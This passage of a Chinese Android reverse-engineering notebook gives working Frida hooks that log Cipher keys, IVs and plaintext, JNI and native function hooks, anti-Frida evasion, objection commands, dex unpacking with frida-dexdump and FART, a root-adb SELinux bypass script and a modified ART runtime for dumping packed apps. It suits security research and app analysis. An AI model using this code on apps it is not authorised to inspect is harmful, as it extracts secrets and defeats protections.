    var ByteString = Java.use("com.android.okhttp.okio.ByteString");

    function toBase64(tag, data) {
        console.log(tag + " Base64: ", ByteString.of(data).base64());
    }

    function toHex(tag, data) {
        console.log(tag + " Hex: ", ByteString.of(data).hex());
    }

    function toUTF8(tag, data) {
        console.log(tag + " UTF8: ", ByteString.of(data).utf8());
    }

    var cipher = Java.use("javax.crypto.Cipher");

    cipher.init.overload('int', 'java.security.Key').implementation = function () {
        console.log("---- ---- 方法调用 ---- ----");
        console.log("Cipher.init('int', 'java.security.Key')");
        var algorithm = this.getAlgorithm();
        var tag = algorithm + " 密钥";
        var className = JSON.stringify(arguments[1]);
        if (className.indexOf("OpenSSLRSAPrivateKey") === -1) {
            var keyBytes = arguments[1].getEncoded();
            toUTF8(tag, keyBytes);
            // toHex(tag, keyBytes);
            toBase64(tag, keyBytes);
        }
        showStacks();
        console.log("---- ---- ---- ---- ----\n");
        return this.init.apply(this, arguments);
    }
    cipher.init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function () {
        console.log("---- ---- 方法调用 ---- ----");
        console.log("Cipher.init('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec')");
        var algorithm = this.getAlgorithm();
        var keyTag = algorithm + " 密钥";
        var keyBytes = arguments[1].getEncoded();
        toUTF8(keyTag, keyBytes);
        // toHex(keyTag, keyBytes);
        // toBase64(keyTag, keyBytes);
        var ivTag = algorithm + " 初始向量";
        var iv = Java.cast(arguments[2], Java.use("javax.crypto.spec.IvParameterSpec"));
        var ivBytes = iv.getIV();
        toUTF8(ivTag, ivBytes);
        // toHex(ivTag, ivBytes);
        // toBase64(ivTag, ivBytes);
        showStacks();
        console.log("---- ---- ---- ---- ----\n");
        return this.init.apply(this, arguments);
    }

    cipher.doFinal.overload('[B').implementation = function () {
        console.log("---- ---- 方法调用 ---- ----");
        console.log("Cipher.doFinal('[B')");
        var algorithm = this.getAlgorithm();
        var inputTag = algorithm + " 输入";
        var data = arguments[0];
        toUTF8(inputTag, data);
        // toHex(inputTag, data);
        toBase64(inputTag, data);
        var result = this.doFinal.apply(this, arguments);
        console.log();
        var outputTag = algorithm + " 输出";
        toUTF8(outputTag, result);
        // toHex(outputTag, result);
        toBase64(outputTag, result);
        showStacks();
        console.log("---- ---- ---- ---- ----\n");
        return result;
    }
    cipher.doFinal.overload('[B', 'int', 'int').implementation = function () {
        console.log("---- ---- 方法调用 ---- ----");
        console.log("Cipher.doFinal('[B', 'int', 'int')");
        var algorithm = this.getAlgorithm();
        var inputTag = algorithm + " 输入";
        var data = arguments[0];
        toUTF8(inputTag, data);
        // toHex(inputTag, data);
        toBase64(inputTag, data);
        var result = this.doFinal.apply(this, arguments);
        console.log();
        var outputTag = algorithm + " 输出";
        toUTF8(outputTag, result);
        // toHex(outputTag, result);
        toBase64(outputTag, result);
        console.log("arguments[1]:", arguments[1],);
        console.log("arguments[2]:", arguments[2]);
        showStacks();
        console.log("---- ---- ---- ---- ----\n");
        return result;
    }
});
```

#### JNI hook

```JavaScript
function hook_dlopen() {
    console.log("start hook");

    Interceptor.attach(Module.findExportByName(null, "dlopen"), {
        onEnter: function (args) {
            const pathptr = args[0];
            if (pathptr) {
                // 两种写法都可以
                const path = Memory.readCString(pathptr);
                console.log("dlopen called with: " + path);
            }
        }
    })

    Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"), {
        onEnter: function (args) {
            const pathptr = args[0];
            this.is_target = false;
            if (pathptr) {
                // 两种写法都可以
                const path = ptr(pathptr).readCString();
                console.log("android_dlopen_ext called with: ", path);
                if (path.includes("libdemo3.so")) {
                    this.is_target = true;
                }
            }
        },
        onLeave: function () {
            if (this.is_target) {
                const func_addr = Module.findExportByName("libdemo3.so", "Java_com_example_demo3_MainActivity_getStringLengthFromJNI");
                console.log("target function at " + func_addr);

				// hook
                Interceptor.attach(func_addr, {
                    onEnter: function (args) {
                        // 读取UTF-8字符串
                        console.log("\t[key argument]: ", Java.vm.tryGetEnv().getStringUtfChars(args[2], null).readCString());
                    },
                    onLeave: function (retval) {
                        console.log("\t[return value]: ", retval);
                    }
                })
            }
        }
    })
}

setImmediate(hook_dlopen);
```

#### JNI 参数篡改

```JavaScript
function hook_dlopen() {
    console.log("start hook");

    Interceptor.attach(Module.findExportByName(null, "dlopen"), {
        onEnter: function (args) {
            const pathptr = args[0];
            if (pathptr) {
                // 两种写法都可以
                const path = Memory.readCString(pathptr);
                console.log("dlopen called with: " + path);
            }
        }
    })

    Interceptor.attach(Module.findExportByName(null, "android_dlopen_ext"), {
        onEnter: function (args) {
            const pathptr = args[0];
            this.is_target = false;
            if (pathptr) {
                // 两种写法都可以
                const path = ptr(pathptr).readCString();
                console.log("android_dlopen_ext called with: ", path);
                if (path.includes("libdemo3.so")) {
                    this.is_target = true;
                }
            }
        },
        onLeave: function () {
            if (this.is_target) {
                const func_addr = Module.findExportByName("libdemo3.so", "Java_com_example_demo3_MainActivity_getStringLengthFromJNI");
                console.log("target function at " + func_addr);

                // 参数篡改
                const test_func = new NativeFunction(func_addr, 'int', ['pointer', 'pointer', 'pointer']);
                Interceptor.replace(test_func, new NativeCallback(function (env, thiz, str) {
                    console.log("\t[key argument]: ", Java.vm.tryGetEnv().getStringUtfChars(str, null).readCString());
                    const test_input = Java.vm.tryGetEnv().newStringUtf("空山新雨后");
                    const test_retval = test_func(env, thiz, test_input);
                    // console.log("\t[return value]: ", test_retval);
                    return test_retval;
                }, 'int', ['pointer', 'pointer', 'pointer']));
            }
        }
    })
}

setImmediate(hook_dlopen);
```

#### Native层函数hook

```JavaScript
function HookNative() {
    console.log("\nStarting hook ...");

    const baseAddress = Module.findBaseAddress("libroysue.so");
    console.log("baseAddress: " + baseAddress);

    // 直接寻找导出函数
    // if (baseAddress) {
    //     const funcAddr = Module.findExportByName('libroysue.so', '_Z4fuckP7_JNIEnvP7_jclassP8_jstring');
    //     console.log("funcAddr: " + funcAddr);
    //     console.log(`offset: 0x${(funcAddr - baseAddress).toString(16)}`);
    // }

    // 枚举导出
    // const exports = Module.enumerateExports('libroysue.so');
    // for (const iterator of exports) {
    //     console.log(JSON.stringify(iterator))
    // }

    // 枚举符号 非导出函数要在这里找
    const symbols = Module.enumerateSymbols('libroysue.so');
    for (const iterator of symbols) {
        // if (iterator.name === "ll11lll1l1" && iterator.type === "function") {
        if (iterator.name === "ll11lll1l1") {
            const targetFuncAddr = iterator.address;
            Interceptor.attach(targetFuncAddr, {
                onLeave: function (result) {
                    console.log('key: ', result.readCString());
                }
            });
        }

        if (iterator.name === "ll11l1l1l1") {
            const targetFuncAddr = iterator.address;
            Interceptor.attach(targetFuncAddr, {
                onLeave: function (result) {
                    console.log('iv: ', result.readUtf8String());
                }
            });
        }
    }

}

// 这里最好设置延迟 否则可能加载不到
setTimeout(HookNative, 3000);
```

#### 反frida调试

- 检测进程 修改文件名即可

- 检测默认端口（27042）即0x（69A2）

```bash
netstat -tulnp | grep 27042
# tcp        0      0 127.0.0.1:27042         0.0.0.0:*               LISTEN      18280/frida-server-16.5.1-android-arm64
cat /proc/net/tcp | grep :69A2
# 45: 0100007F:CFD7 0100007F:69A2 01 00000000:00000000 00:00000000 00000000  2000        0 848357 1 0000000000000000 20 4 30 10 -1

# 绕过方式：指定端口运行
./frida-server -l 0.0.0.0:8888
```

- ptrace 已经被ptrace了，有条件的话可以spwan方式启动

- 当前进程的maps信息中会有frida-agent动态库
通过使用魔改版（如hluda）隐藏特征

```bash
cat /proc/10411/maps | grep frida
# 6fcaed7000-6fcb8f1000 r--p 00000000 00:05 837927                         /memfd:frida-agent-64.so (deleted)
# 6fcb8f2000-6fcc621000 r-xp 00a1a000 00:05 837927                         /memfd:frida-agent-64.so (deleted)
# 6fcc621000-6fcc6f2000 r--p 01748000 00:05 837927                         /memfd:frida-agent-64.so (deleted)
# 6fcc6f3000-6fcc70f000 rw-p 01819000 00:05 837927                         /memfd:frida-agent-64.so (deleted)
```

- hook特征

```
native层: inline-hook
函数开头变为了: 0xd61f020058000050
其中0x58000050 表示 ldr x16, [pc, #8]
加载地址到寄存器中
0xd61f0200 表示 br x16
根据寄存器中的值进行跳转

java层: 转为native函数
特征: & 0x80000 == 0
变为：& 0x80000 != 0
```

 #### objection

```shell
# 连接应用
objection -g "<APP_NAME>" explore

# 列出Activity
android hooking list activities
# 启动Activity
android intent launch_activity "<ACTIVITY_NAME>"

# 列出类名 结果很长 一般不用 用搜索
android hooking list classes
# 搜索类名
android hooking search classes emulator
# 列出类的方法
android hooking list class_methods android.hardware.display.DisplayManager
# Hook 方法 监听参数、调用堆栈、返回值
android hooking watch class_method com.bonc.moveportal.util.CheckEmulatorUtil.a --dump-args --dump-backtrace --dump-return

# 列出 Hook
jobs list
# 结束 Hook
jobs kill 124069
# Hook 整个类
android hooking watch class java.io.File
# 堆上搜索实例
android heap search instances com.android.settings.DisplaySettings
# 调用无参实例方法
android heap execute 0x2526 getPreferenceScreenResId
# 调用有参实例方法
android heap execute 0x2526
# demo.instanceFunc(x,y) 调用

# Spawn方式Hook
objection -g "com.bonc.moveportal" explore --startup-command 'android hooking watch class java.io.File'
# 搜索内存中的方法
android hooking search methods CheckIsNotRealPhone
# 列出Service
android hooking list services

# 查看命令帮助
help env
```

### 脱壳

#### frida-dexdump

- 安装

```shell
python -m venv env
# activate
pip install frida-dexdump
```

- 破解前台应用

```shell
frida-dexdump -FU
```

- 破解指定应用

```shell
frida-dexdump -U -f <APP_NAME>
```

- 检索输出结果

```Shell
grep -ril "MainActivity" *

grep -ril "MainActivity" * | xargs du -h
```

#### frida-fart

- 拷贝fart.so和fart64.so到/data/app目录下，并使用chmod 777 设置好权限

- 以反射方式破解前台应用

```shell
frida -FU -l frida_fart_reflection.js
fart()
```

- hook方式破解指定应用

```shell
frida -U -f <APP_NAME> -l frida_fart_hook.js --no-pause
```

### 强制开启 root adb

- `adb_root.sh`

```shell
#!/system/bin/sh
resetprop ro.debuggable 1
resetprop service.adb.root 1
magiskpolicy --live 'allow adbd adbd process setcurrent'
magiskpolicy --live 'allow adbd su process dyntransition'
magiskpolicy --live 'permissive { su }'
kill -9 `ps -A | grep adbd | awk '{print $2}'`
```

- 重启adbd

```shell
adb push adb_root.sh /sdcard/Download/

adb shell "su -c 'sh /sdcard/Download/adb_root.sh'"

# adb remount
# adb shell
```

- frida-server

```shell
adb push frida-server* /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server*"

adb shell "su -c '/data/local/tmp/frida-server-16.1.8-android-arm64 &'"
```

### 安卓8.0.0沙箱源码分析

#### 脱壳机

- `frameworks/base/core/java/android/app/ActivityThread.java`

ActivityThread负责管理应用程序中所有Activity的生命周期。当Application启动后（`attachBaseContext()`和`onCreate()`是app中最先执行的方法，壳通常都是通过实现这两个函数，达到dex解密、加载，hook执行流程，替换ClassLoader、Application的目标。因此，我们可以选择任意一个在onCreate()之后执行的函数中进行dump），ActivityThread会负责创建应用程序的主Activity。可以选择在ActivityThread中的performLaunchActivity函数作为时机。

```Java
import java.lang.reflect.Constructor;
// import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public final class ActivityThread {

	private Activity performLaunchActivity(ActivityClientRecord r, Intent customIntent) {
		// return 前创建一个fart线程
		mRunDumpThread();
		// ... return
	}
    
    // dump单个类
    public static void mDumpClass(String className, Method dumpMethod, ClassLoader classLoader) {
        try {
            Class<?> targetClass = classLoader.loadClass(className);
            // dump构造
            Constructor<?>[] constructors = targetClass.getDeclaredConstructors();
            for (Constructor<?> constructor : constructors) {
                // 其实就是主动调用一次并dump
                dumpMethod.invoke(null, constructor);
            }
            // dump函数
            Method[] methods = targetClass.getDeclaredMethods();
            for (Method method : methods) {
                // 其实就是主动调用一次并dump
                dumpMethod.invoke(null, method);
            }
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    // 遍历ClassLoader中的全部类 并dump
    public static void mDumpAllInClassLoader(ClassLoader classLoader) {
        try {
            // 获取classLoader的pathList值
            Class<?> BaseDexClassLoaderClass = Class.forName("dalvik.system.BaseDexClassLoader");
            Field pathListField = BaseDexClassLoaderClass.getDeclaredField("pathList");
            pathListField.setAccessible(true);
            Object pathListObj = pathListField.get(classLoader);
            // 获取pathList的dexElements值
            Class<?> DexPathListClass = Class.forName("dalvik.system.DexPathList");
            Field dexElementsField = DexPathListClass.getDeclaredField("dexElements");
            dexElementsField.setAccessible(true);
            Object dexElementsObj = dexElementsField.get(pathListObj);
            Object[] dexElementList = (Object[]) dexElementsObj;
            // 获取dexFile字段的反射
            Class<?> elementClass = Class.forName("dalvik.system.DexPathList$Element");
            Field dexFileField = elementClass.getDeclaredField("dexFile");
            dexFileField.setAccessible(true);

            // 获取DexFile类中的关键信息
            Class<?> DexFileClass = classLoader.loadClass("dalvik.system.DexFile");
            // 获取到两个关键的方法
            Method getClassNameListMethod = DexFileClass.getDeclaredMethod("getClassNameList", Object.class);
            getClassNameListMethod.setAccessible(true);
            // 这个是自定义的dump方法
            Method dumpMethodCodeMethod = DexFileClass.getDeclaredMethod("mDumpMethodCode", Object.class);
            dumpMethodCodeMethod.setAccessible(true);

            // 获取两个cookie字段的反射
            Field mCookieField = DexFileClass.getDeclaredField("mCookie");
            mCookieField.setAccessible(true);
            Field mInternalCookieField = DexFileClass.getDeclaredField("mInternalCookie");
            mCookieField.setAccessible(true);

            // 遍历dexElements
            for (Object dexElement : dexElementList) {
                Object dexFileObj = dexFileField.get(dexElement);
                Object mCookieObj = mCookieField.get(dexFileObj);
                // 选择能用的cookie
                if (mCookieObj == null) {
                    Object mInternalCookieObj = mInternalCookieField.get(dexFileObj);
                    if (mInternalCookieObj == null) {
                        continue;
                    } else {
                        mCookieObj = mInternalCookieObj;
                    }
                }
                // 获取classNameList
                Object classNameListObj = getClassNameListMethod.invoke(dexFileObj, mCookieObj);
                String[] classesName = (String[]) classNameListObj;
                // 遍历classNameList
                for (String className : classesName) {
                    // 逐个dump
                    mDumpClass(className, dumpMethodCodeMethod, classLoader);
                }
            }
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    // 递归dump当前ClassLoader及其parent
    public static void mRecursiveDump() {
        ClassLoader currentClassLoader = currentActivityThread().mBoundApplication.info.getApplication().getClassLoader();
        if (currentClassLoader == null) {
            return;
        }
        if (!currentClassLoader.toString().contains("java.lang.BootClassLoader")) {
            mDumpAllInClassLoader(currentClassLoader);
        }
        ClassLoader parentClassLoader = currentClassLoader.getParent();
        while (parentClassLoader != null) {
            if (!currentClassLoader.toString().contains("java.lang.BootClassLoader")) {
                mDumpAllInClassLoader(parentClassLoader);
            }
            parentClassLoader = parentClassLoader.getParent();
        }
    }

    // 创建一个线程 休眠一分钟后 开始递归dump
    public static void mRunDumpThread() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(60000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
                mRecursiveDump();
            }
        }).start();
    }

}
```

- `art/runtime/art_method.cc`

实现5个函数供调用
在函数调用时对其进行dump

```C
#include <fcntl.h>

#define M_GET_TID() syscall(__NR_gettid)

namespace art {
    // 获取code item的尾部指针
    uint8_t *m_get_code_item_tail(const uint8_t **pData) {
        uint32_t num_of_list = DecodeUnsignedLeb128(pData);
        for (; num_of_list > 0; num_of_list--) {
            int32_t num_of_handlers = DecodeSignedLeb128(pData);
            int num = (num_of_handlers <= 0) ? -num_of_handlers : num_of_handlers;
            for (; num > 0; num--) {
                DecodeUnsignedLeb128(pData);
                DecodeUnsignedLeb128(pData);
            }
            if (num_of_handlers <= 0) {
                DecodeUnsignedLeb128(pData);
            }
        }
        return (uint8_t * )(*pData);
    }

    // base64 编码
    extern "C" char *m_base64_encode(char *str, long str_len, long *outlen) {
        long len;
        char *res;
        int i, j;
        const char *base64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        if (str_len % 3 == 0)
            len = str_len / 3 * 4;
        else
            len = (str_len / 3 + 1) * 4;

        res = (char *) malloc(sizeof(char) * (len + 1));
        if (res == nullptr) {
            LOG(ERROR) << "m_base64_encode malloc failed!!size:" << len;
            return nullptr;
        }
        res[len] = '\0';
        *outlen = len;
        for (i = 0, j = 0; i < len - 2; j += 3, i += 4) {
            res[i] = base64_table[str[j] >> 2];
            res[i + 1] = base64_table[(str[j] & 0x3) << 4 | (str[j + 1] >> 4)];
            res[i + 2] = base64_table[(str[j + 1] & 0xf) << 2 | (str[j + 2] >> 6)];
            res[i + 3] = base64_table[str[j + 2] & 0x3f];
        }

        switch (str_len % 3) {
            case 1:
                res[i - 2] = '=';
                res[i - 1] = '=';
                break;
            case 2:
                res[i - 1] = '=';
                break;
        }

        return res;
    }

    // 通过ArtMethod dump整个dex文件
    extern "C" void m_dump_dex_file_by_art_method(ArtMethod *art_method)
    REQUIRES_SHARED(Locks::mutator_lock_) {
            char * dexfilepath = (char *) malloc(sizeof(char) * 1000);
            if (dexfilepath==nullptr)
            {
                LOG(INFO) << "ArtMethod::m_dump_dex_file_by_art_method, method name: "
                          << art_method->PrettyMethod().c_str() << "malloc 1000 byte failed";
                return;
            }
            int result=0;
            int fcmdline =-1;
            char szCmdline[64]= { 0 };
            char szProcName[256] = { 0 };

            // 获取进程名
            int procid = getpid();
            sprintf(szCmdline, "/proc/%d/cmdline", procid);
            fcmdline = open(szCmdline, O_RDONLY, 0644);
            if (fcmdline >0)
            {
                result = read(fcmdline, szProcName, 256);
                if (result < 0) {
                    LOG(ERROR)
                            << "ArtMethod::m_dump_dex_file_by_art_method, open cmdline file error";
                    return;
                }
                close(fcmdline);

            }

            if (szProcName[0])
            {
                // 通过ArtMethod获取到DexFile
                const DexFile *dex_file = art_method->GetDexFile();
                const uint8_t *begin_ = dex_file->Begin();  // Start of data.
                size_t size_ = dex_file->Size();  // Length of data.

                memset(dexfilepath, 0, 1000);
                int size_int_ = (int) size_;

                memset(dexfilepath, 0, 1000);
                // /data/data/com.example.app/12345_dexfile_execute.dex
                sprintf(dexfilepath, "/data/data/%s/%d_dexfile_execute.dex", szProcName, size_int_);
                int dexfilefp = open(dexfilepath, O_RDONLY, 0666);
                if (dexfilefp > 0) {
                    close(dexfilefp);
                    dexfilefp = 0;
                } else {
                    int fp = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0666);
                    if (fp > 0) {
                        result = write(fp, (void *) begin_, size_);
                        if (result < 0) {
                            LOG(ERROR)
                                    << "ArtMethod::m_dump_dex_file_by_art_method, open dex file path error";
                        }
                        fsync(fp);
                        close(fp);
                        memset(dexfilepath, 0, 1000);
                        // 记录其中包含哪些类 size部分和dex文件一致
                        sprintf(dexfilepath, "/data/data/%s/%d_classlist_execute.txt", szProcName,
                                size_int_);
                        int classlistfile = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0666);
                        if (classlistfile > 0) {
                            for (size_t ii = 0; ii < dex_file->NumClassDefs(); ++ii) {
                                const DexFile::ClassDef &class_def = dex_file->GetClassDef(ii);
                                const char *descriptor = dex_file->GetClassDescriptor(class_def);
                                result = write(classlistfile, (void *) descriptor,
                                               strlen(descriptor));
                                if (result < 0) {
                                }
                                const char *temp = "\n";
                                result = write(classlistfile, (void *) temp, 1);
                                if (result < 0) {
                                }
                            }
                            fsync(classlistfile);
                            close(classlistfile);

                        }
                    }
                }
            }

            if (dexfilepath!=nullptr)
            {
                free(dexfilepath);
                dexfilepath = nullptr;
            }

    }

    // dump ArtMethod
    extern "C" void m_dump_art_method(ArtMethod *art_method)
    REQUIRES_SHARED(Locks::mutator_lock_) {
            char * dexfilepath = (char *) malloc(sizeof(char) * 1000);
            if (dexfilepath==nullptr)
            {
                LOG(INFO) << "ArtMethod::m_dump_art_method, method name:"
                          << art_method->PrettyMethod().c_str() << "malloc 1000 byte failed";
                return;
            }
            int result=0;
            int fcmdline =-1;
            char szCmdline[64]= { 0 };
            char szProcName[256] = { 0 };

            // 获取进程名
            int procid = getpid();
            sprintf(szCmdline, "/proc/%d/cmdline", procid);
            fcmdline = open(szCmdline, O_RDONLY, 0644);
            if (fcmdline >0)
            {
                result = read(fcmdline, szProcName, 256);
                if (result < 0) {
                    LOG(ERROR) << "ArtMethod::m_dump_art_method, open cmdline file file error";
                    return;
                }
                close(fcmdline);
            }

            if (szProcName[0])
            {

                const DexFile *dex_file = art_method->GetDexFile();
                const uint8_t *begin_ = dex_file->Begin();  // Start of data.
                size_t size_ = dex_file->Size();  // Length of data.

                memset(dexfilepath, 0, 1000);
                int size_int_ = (int) size_;

                memset(dexfilepath, 0, 1000);
                sprintf(dexfilepath, "/data/data/%s/%d_dexfile.dex", szProcName, size_int_);
                int dexfilefp = open(dexfilepath, O_RDONLY, 0666);
                if (dexfilefp > 0) {
                    close(dexfilefp);
                    dexfilefp = 0;

                } else {
                    int fp = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0666);
                    if (fp > 0) {
                        result = write(fp, (void *) begin_, size_);
                        if (result < 0) {
                        }
                        fsync(fp);
                        close(fp);
                        memset(dexfilepath, 0, 1000);
                        sprintf(dexfilepath, "/data/data/%s/%d_classlist.txt", szProcName,
                                size_int_);
                        int classlistfile = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0666);
                        if (classlistfile > 0) {
                            for (size_t ii = 0; ii < dex_file->NumClassDefs(); ++ii) {
                                const DexFile::ClassDef &class_def = dex_file->GetClassDef(ii);
                                const char *descriptor = dex_file->GetClassDescriptor(class_def);
                                result = write(classlistfile, (void *) descriptor,
                                               strlen(descriptor));
                                if (result < 0) {
                                }
                                const char *temp = "\n";
                                result = write(classlistfile, (void *) temp, 1);
                                if (result < 0) {
                                }
                            }
                            fsync(classlistfile);
                            close(classlistfile);

                        }
                    }


                }

                // 上面和通过ArtMethod dump整个dex文件一样
                const DexFile::CodeItem *code_item = art_method->GetCodeItem();
                if (LIKELY(code_item != nullptr)) {
                    int code_item_len = 0;
                    uint8_t *item = (uint8_t *) code_item;
                    if (code_item->tries_size_ > 0) {
                        const uint8_t *handler_data = (const uint8_t *) (DexFile::GetTryItems(
                                *code_item, code_item->tries_size_));
                        uint8_t *tail = m_get_code_item_tail(&handler_data);
                        code_item_len = (int) (tail - item);
                    } else {
                        code_item_len = 16 + code_item->insns_size_in_code_units_ * 2;
                    }
                    memset(dexfilepath, 0, 1000);
                    int size_int = (int) dex_file->Size();  // Length of data
                    uint32_t method_idx = art_method->GetDexMethodIndexUnchecked();
                    sprintf(dexfilepath, "/data/data/%s/%d_ins_%d.bin", szProcName, size_int,
                            (int) M_GET_TID());
                    int fp2 = open(dexfilepath, O_CREAT | O_APPEND | O_RDWR, 0666);
                    if (fp2 > 0) {
                        lseek(fp2, 0, SEEK_END);
                        memset(dexfilepath, 0, 1000);
                        int offset = (int) (item - begin_);

                        result = write(fp2, "{name:", 6);
                        if (result < 0) {

                        }
                        const char *methodname = art_method->PrettyMethod().c_str();
                        result = write(fp2, methodname, strlen(methodname));
                        if (result < 0) {

                        }
                        memset(dexfilepath, 0, 1000);
                        sprintf(dexfilepath, ",method_idx:%d,offset:%d,code_item_len:%d,ins:",
                                method_idx, offset, code_item_len);
                        int contentlength = strlen(dexfilepath);
                        result = write(fp2, (void *) dexfilepath, contentlength);
                        if (result < 0) {

                        }

                        // 将指令base64编码后写到bin文件中
                        long outlen = 0;
                        char *base64result = m_base64_encode((char *) item, (long) code_item_len,
                                                             &outlen);
                        if (base64result != nullptr) {
                            result = write(fp2, base64result, outlen);
                            if (result < 0) {
                            }
                        } else {
                            const char *errorinfo = "base64encode codeitem error";
                            result = write(fp2, errorinfo, strlen(errorinfo));
                            if (result < 0) {
                            }

                        }
                        if (base64result != nullptr) {
                            free(base64result);
                            base64result = nullptr;
                        }
                        result = write(fp2, "};", 2);
                        if (result < 0) {
                        }
                        fsync(fp2);
                        close(fp2);
                    }

                }


            }

            if (dexfilepath!=nullptr)
            {
                free(dexfilepath);
                dexfilepath = nullptr;
            }

    }

    // 主动调用ArtMethod
    extern "C" void m_invoke_art_method(ArtMethod *art_method)
    REQUIRES_SHARED(Locks::mutator_lock_) {
            JValue * result = nullptr;
            Thread *self=nullptr;
            uint32_t temp=6;
            uint32_t* args=&temp;
            uint32_t args_size=6;
            // 这里在第一个参数传入空指针 标识自定义的主动调用
            art_method->Invoke(self, args, args_size, result, "m_trigger");
    }

    // 修改Invoke方法 在主动调用时进行dump
    void ArtMethod::Invoke(Thread *self, uint32_t *args, uint32_t args_size, JValue *result,
                           const char *shorty) {
        // 空指针表示自定义的主动调用
        if (self == nullptr) {
            // 对方法进行dump
            m_dump_art_method(this);
            return;
        }
        // ...
    }
}
```

- `art/runtime/native/dalvik_system_DexFile.cc`

实现2个native方法

```C
namespace art {
    // load method from java_lang_reflect_Method.cc
    extern "C" ArtMethod *m_java_obj_to_art_method(JNIEnv *env, jobject javaMethod);
    // load method from art_method.cc
    extern "C" void m_invoke_art_method(ArtMethod *art_method);

    static void DexFile_mDumpMethodCode(JNIEnv *env, jclass, jobject method) {
        if (method != nullptr) {
            // 先将通过反射获得的方法转变为ArtMethod对象
            ArtMethod *target_method = m_java_obj_to_art_method(env, method);
            // 主动调用该方法
            m_invoke_art_method(target_method);
        }
    }

    static JNINativeMethod gMethods[] = {
            // ... + ,
            NATIVE_METHOD(DexFile, mDumpMethodCode,
                          "(Ljava/lang/Object;)V")
    }; 
}
```

- `libcore/dalvik/src/main/java/dalvik/system/DexFile.java`

引入2个native方法

```Java
    // add native method mDumpMethodCode
    private static native void mDumpMethodCode(Object method);
```

- `art/runtime/interpreter/interpreter.cc`

```C
namespace art {
    // 从art_method.cc中引入m_dump_dex_file_by_art_method方法
    extern "C" void m_dump_dex_file_by_art_method(ArtMethod *art_method);
    
    namespace interpreter {
      
        static inline JValue Execute(
                Thread *self,
                const DexFile::CodeItem *code_item,
                ShadowFrame &shadow_frame,
                JValue result_register,
                bool stay_in_interpreter = false)

        REQUIRES_SHARED(Locks::mutator_lock_) {
                // 类的初始化函数始终运行在解释模式下 此时通过art_method对整个dex文件进行dump
                if (strstr(shadow_frame.GetMethod()->PrettyMethod().c_str(), "<clinit>")){
                    m_dump_dex_file_by_art_method(shadow_frame.GetMethod());
                }
                // ...
        }
    }
}
```

- `art/runtime/native/java_lang_reflect_Method.cc`

```C
namespace art {
    // add m_java_obj_to_art_method
    extern "C" ArtMethod *m_java_obj_to_art_method(JNIEnv *env, jobject javaMethod) {
        ScopedFastNativeObjectAccess soa(env);
        // 将方法的反射转变为ArtMethod对象
        ArtMethod *method = ArtMethod::FromReflectedMethod(soa, javaMethod);
        return method;
    }
}
```

#### JNI 动态注册追踪

`art/runtime/jni_internal.cc`

```C++
static jint RegisterNatives(
// ...
) {
	// ...
	LOG(WARNING) << "[JNI] Registering JNI native methods { count: " << method_count << " }";
	for (jint i = 0; i < method_count; ++i) {
		// name sig fnPtr
		LOG(WARNING)
			<< "[JNI] Registering JNI native method { name: " << name
			<< " , signature: " << sig
			<< " , address: " << fnPtr << " }";
	}
}
```


### 内核相关

#### 改内核配置 重新编译内核

```shell
# 加载编译环境
source build/envsetup.sh
# breakfast <device_name>
breakfast z2_plus
# 查看内核配置文件位置 位于设备树目录下的BoardConfig.mk
cat device/zuk/z2_plus/BoardConfig.mk
# TARGET_KERNEL_CONFIG := z2_plus_defconfig

# 切换到内核目录下
cd kernel/zuk/msm8996/
# 备份配置文件
cp ./arch/arm64/configs/z2_plus_defconfig .config

### !!!上述过程繁琐且不好用!!!
# 还是先备份arch/arm64/configs/z2_plus_defconfig
# 然后直接修改最简单
CONFIG_KALLSYMS=y
CONFIG_KALLSYMS_ALL=y
CONFIG_OVERLAY_FS=y

# 清除缓存
make mrproper
# 切换到根目录
croot
# 重新编译bootimage
make bootimage
```

#### 可加载内核模块（LKM）

```bash
# 查看内核配置
cat kernel/xiaomi/picasso/arch/arm64/configs/picasso_user_defconfig

# 需要如下配置
CONFIG_MODULES=y
CONFIG_MODULE_UNLOAD=y
CONFIG_MODVERSIONS=y

# 重新编译内核 写入手机
```

`drivers` 目录下创建模块目录 `greet` 其中分别创建源码文件 `greet.c` 和 `Makefile`

```cpp
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zhang3");
MODULE_DESCRIPTION("A Simple Hello World Kernel Module");

static int __init greet_init(void) {
    printk(KERN_INFO "Aloha, World!\n");
    return 0;
}

static void __exit greet_exit(void) {
    printk(KERN_INFO "CUUU\n");
}

module_init(greet_init);
module_exit(greet_exit);
```

```makefile
obj-m	+= greet.o
```

父目录 `drivers` 中的 `Makefile` 增加一行

```makefile
obj-y                   += greet/
```

编译后的产物位于 `crDroid13/out/target/product/picasso/obj/KERNEL_OBJ/drivers/greet`

使用测试

```bash
adb push greet.ko /data/local/tmp

insmod greet.ko # 安装模块

lsmod # 列出模块
# Module                  Size  Used by
# greet                  20480  0

dmesg # 查看内核日志
dmesg | tail -n 10

rmmod greet # 卸载模块
```
### unidbg

#### 简单示例

```Java
package com.example.demo3;

import com.github.unidbg.AndroidEmulator;
import com.github.unidbg.LibraryResolver;
import com.github.unidbg.arm.backend.DynarmicFactory;
import com.github.unidbg.linux.android.AndroidEmulatorBuilder;
import com.github.unidbg.linux.android.AndroidResolver;
